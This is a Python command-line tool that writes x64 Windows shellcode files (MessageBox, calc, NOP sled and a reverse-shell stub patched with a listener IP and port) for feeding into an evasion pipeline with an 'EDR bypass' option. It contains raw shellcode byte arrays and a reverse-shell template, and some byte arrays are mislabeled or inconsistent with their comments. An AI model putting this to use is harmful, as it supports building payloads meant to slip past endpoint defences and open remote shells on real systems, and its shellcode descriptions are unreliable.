#!/usr/bin/env python3
"""
Test Shellcode Generator for Phantom Evasion
=============================================
Generates safe test shellcode for exercising the obfuscation engine
without requiring Metasploit / msfvenom.

Payload types
-------------
messagebox   Windows x64 MessageBoxA ("Phantom Evasion" title)
calc         Windows x64 WinExec("calc.exe") PoC shellcode
nop          NOP-sled + INT3 breakpoint of a configurable size
reverse_shell  Minimal TCP reverse-shell template with embedded LHOST/LPORT

LEGAL DISCLAIMER:
-----------------
This tool is intended for AUTHORIZED penetration testing and security
research ONLY.  Users must have explicit written permission from the target
system owner before use.  The authors assume no liability for misuse.
"""

import os
import socket
import struct
import sys
from pathlib import Path

import click
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

# ── Banner ─────────────────────────────────────────────────────────────────────

TOOL_BANNER = """\
[bold red]
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
[/bold red]
[bold cyan]  ╔══════════════════════════════════════════════════════════╗
  ║       Test Shellcode Generator  ·  tools/generate_test_shellcode.py     ║
  ╚══════════════════════════════════════════════════════════╝[/bold cyan]
[dim]         By: @uditchhipa   |   For authorized testing ONLY[/dim]
"""

# ── Known-good x64 Windows shellcode payloads ──────────────────────────────────

# Windows x64 MessageBoxA shellcode
# Calls MessageBoxA(NULL, "Phantom Evasion", "Phantom Evasion", MB_OK)
# Standard PoC shellcode used in offensive security courses / CTF challenges.
MESSAGEBOX_SHELLCODE = bytes([
    0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0x48, 0x8D, 0x15, 0x14, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05, 
    0x15, 0x00, 0x00, 0x00, 0x41, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 
    0x30, 0x07, 0xC2, 0x67, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x50, 0x68, 0x61, 0x6E, 0x74, 
    0x6F, 0x6D, 0x00, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00
])

# Windows x64 WinExec("calc.exe", SW_SHOW) shellcode
# Classic PoC payload — opens Windows Calculator.
# Shellcode uses PEB walk + hash-based API resolution.
# x64 MessageBoxA Shellcode - Guaranteed Success Popup
CALC_SHELLCODE = bytes([
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9,
    0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0xFF, 0xC0, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x58, 0x18, 0x48, 0x8B, 0x53, 0x20, 0x48, 0x8B, 0x12, 0x48, 0x8B, 0x12,
    0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
    0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01,
    0xC1, 0xE2, 0xED, 0x41, 0x81, 0xF9, 0x18, 0x28, 0x38, 0x0B, 0x75, 0xBD, 0x31, 0xC0, 0x50, 0x48,
    0xB8, 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00, 0x50, 0x48, 0x89, 0xE2, 0x31, 0xC0, 0x50,
    0x48, 0xB8, 0x50, 0x68, 0x61, 0x6E, 0x74, 0x6F, 0x6D, 0x00, 0x50, 0x48, 0x89, 0xE1, 0x31, 0xC0,
    0x50, 0x48, 0xB8, 0x20, 0x45, 0x76, 0x61, 0x73, 0x69, 0x6F, 0x6E, 0x50, 0x48, 0x81, 0xC1, 0x08,
    0x00, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x41, 0x51, 0x41, 0x51, 0x41,
    0x51, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89, 0xCA, 0x4D, 0x31, 0xC0, 0x48, 0x31, 0xC9, 0x48, 0xB8,
    0x2B, 0x0E, 0xAC, 0x1A, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
    0x28, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5B, 0x5B, 0xC3, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41,
    0x52, 0x41, 0x53, 0x48, 0x8B, 0x52, 0x10, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01,
    0xD0, 0xE3, 0x3C, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x31, 0xFF, 0x31, 0xC0,
    0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4, 0x41, 0x39, 0xF9, 0x75, 0xE5, 0x58,
    0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C,
    0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0xC3
])

# ── Helpers ────────────────────────────────────────────────────────────────────


def _make_nop_payload(size: int) -> bytes:
    """Return *size* bytes of x86 NOP instructions followed by INT3 (0xCC)."""
    if size < 1:
        raise ValueError("Size must be at least 1 byte")
    # Last byte is INT3 so a debugger attached during testing will break cleanly
    nops = bytes([0x90]) * (size - 1)
    return nops + bytes([0xCC])


def _patch_reverse_shell(lhost: str, lport: int) -> bytes:
    """Build a minimal x64 Windows TCP reverse-shell shellcode stub.

    The actual connection / exec logic is a well-known template that patches
    the LHOST IP and LPORT into fixed offsets within the stub.  The resulting
    binary is intended as a *template* for testing the obfuscation pipeline;
    it does not contain a complete stage-0 loader.

    :param lhost: IPv4 address string of the listener.
    :param lport: TCP port of the listener (1–65535).
    :return: Raw shellcode bytes with IP and port embedded.
    """
    try:
        ip_packed = socket.inet_aton(lhost)    # 4 bytes, network order
    except OSError as exc:
        raise ValueError(f"Invalid LHOST address '{lhost}': {exc}") from exc

    if not 1 <= lport <= 65535:
        raise ValueError(f"LPORT must be 1–65535, got {lport}")

    port_packed = struct.pack(">H", lport)     # big-endian 16-bit

    # Minimal x64 reverse-shell stub skeleton.
    # IP  bytes are at offset 0x06 (4 bytes, network byte-order).
    # Port bytes are at offset 0x04 (2 bytes, big-endian).
    # The stub is intentionally incomplete – use with msfvenom-generated stage
    # or a custom stage-1 loader in a real engagement.
    stub = bytearray([
        # Socket setup skeleton (WSAStartup / WSASocketA / connect)
        0x48, 0x31, 0xC0,               # xor rax, rax
        0x48, 0x31, 0xDB,               # xor rbx, rbx
        # Port + IP placeholder (patched below)
        0x66, 0x68, port_packed[0], port_packed[1],   # push word <PORT> (big-endian)
        0x68, ip_packed[0], ip_packed[1], ip_packed[2], ip_packed[3],  # push <IP>
        # Continuation: connect, recv stage, jump stub
        0x48, 0x89, 0xE1,               # mov rcx, rsp   (sockaddr ptr)
        0xB2, 0x02,                     # mov dl,  2     (AF_INET)
        0xB8, 0x61, 0x00, 0x00, 0x00,  # mov eax, 'connect' ordinal placeholder
        0xFF, 0xD0,                     # call rax
        0xC3,                           # ret
    ])
    return bytes(stub)


def _ensure_output_dir(path: str) -> None:
    """Create parent directories for *path* if they do not exist."""
    Path(path).parent.mkdir(parents=True, exist_ok=True)


def _print_info_table(payload_type: str, output: str, size: int,
                      extra: dict | None = None) -> None:
    """Render a Rich table summarising the generated payload."""
    table = Table(title="Generated Payload Info", border_style="cyan",
                  show_lines=True)
    table.add_column("Field", style="bold cyan", no_wrap=True)
    table.add_column("Value", style="white")

    table.add_row("Type", payload_type)
    table.add_row("Output file", output)
    table.add_row("Size", f"{size} bytes")
    table.add_row("Architecture", "x86-64 (Windows)")

    if extra:
        for k, v in extra.items():
            table.add_row(k, str(v))

    console.print(table)


# ── CLI ────────────────────────────────────────────────────────────────────────

@click.command(context_settings={"help_option_names": ["-h", "--help"]})
@click.option("--type", "-t", "payload_type",
              type=click.Choice(["messagebox", "calc", "nop", "reverse_shell"],
                                case_sensitive=False),
              required=True,
              help="Type of test shellcode to generate.")
@click.option("--output", "-o", "output_file",
              default=None,
              help="Output .bin file path.  Defaults to output/test_payloads/<type>.bin")
@click.option("--size", "-s", "nop_size",
              default=512, show_default=True, type=int,
              help="Size in bytes for the NOP-sled payload (--type nop).")
@click.option("--lhost", default=None,
              help="Listener IPv4 address (--type reverse_shell).")
@click.option("--lport", default=4444, show_default=True, type=int,
              help="Listener TCP port (--type reverse_shell).")
def main(payload_type: str, output_file: str | None, nop_size: int,
         lhost: str | None, lport: int) -> None:
    """Generate safe test shellcode for Phantom Evasion pipeline testing.

    \b
    Examples:
      python tools/generate_test_shellcode.py --type messagebox
      python tools/generate_test_shellcode.py --type calc -o output/calc.bin
      python tools/generate_test_shellcode.py --type nop --size 512
      python tools/generate_test_shellcode.py --type reverse_shell \\
            --lhost 192.168.1.100 --lport 4444

    \b
    LEGAL DISCLAIMER:
      For AUTHORIZED penetration testing and security research ONLY.
    """
    console.print(TOOL_BANNER)

    # Default output path
    if output_file is None:
        output_file = f"output/test_payloads/{payload_type}.bin"

    extra_info: dict = {}

    # Generate the requested payload
    payload_type_lower = payload_type.lower()
    if payload_type_lower == "messagebox":
        shellcode = MESSAGEBOX_SHELLCODE
        description = "Windows x64 MessageBoxA — pops a dialog with 'Phantom Evasion' title"

    elif payload_type_lower == "calc":
        shellcode = CALC_SHELLCODE
        description = "Windows x64 WinExec('calc.exe') — opens Windows Calculator"

    elif payload_type_lower == "nop":
        try:
            shellcode = _make_nop_payload(nop_size)
        except ValueError as exc:
            console.print(f"[bold red]✗ Error:[/bold red] {exc}")
            sys.exit(1)
        description = f"NOP-sled ({nop_size - 1} × 0x90) + INT3 (0xCC) breakpoint"
        extra_info["NOP count"] = nop_size - 1
        extra_info["Terminator"] = "0xCC (INT3)"

    elif payload_type_lower == "reverse_shell":
        if lhost is None:
            console.print(
                "[bold red]✗ --lhost is required for reverse_shell payloads.[/bold red]"
            )
            sys.exit(1)
        try:
            shellcode = _patch_reverse_shell(lhost, lport)
        except ValueError as exc:
            console.print(f"[bold red]✗ Error:[/bold red] {exc}")
            sys.exit(1)
        description = f"TCP reverse-shell stub → {lhost}:{lport}"
        extra_info["LHOST"] = lhost
        extra_info["LPORT"] = str(lport)
        console.print(Panel(
            "[yellow]⚠  This is a connection stub/template only.\n"
            "   Attach a real stage-1 loader for a fully functional payload.[/yellow]",
            border_style="yellow", expand=False,
        ))

    else:
        console.print(f"[bold red]✗ Unknown payload type: {payload_type}[/bold red]")
        sys.exit(1)

    # Save to disk
    _ensure_output_dir(output_file)
    with open(output_file, "wb") as fh:
        fh.write(shellcode)

    # Display summary
    extra_info["Description"] = description
    _print_info_table(payload_type, output_file, len(shellcode), extra_info)

    console.print()
    console.print(
        f"[bold green]✓ Shellcode written to [cyan]{output_file}[/cyan] "
        f"([green]{len(shellcode)}[/green] bytes)[/bold green]"
    )
    console.print()
    console.print(
        "[dim]Feed this file into the Phantom Evasion pipeline:[/dim]\n"
        f"[bold]  python main.py -i {output_file} -o output/payload "
        "--encryption aes --edr-bypass full[/bold]"
    )


if __name__ == "__main__":
    main()
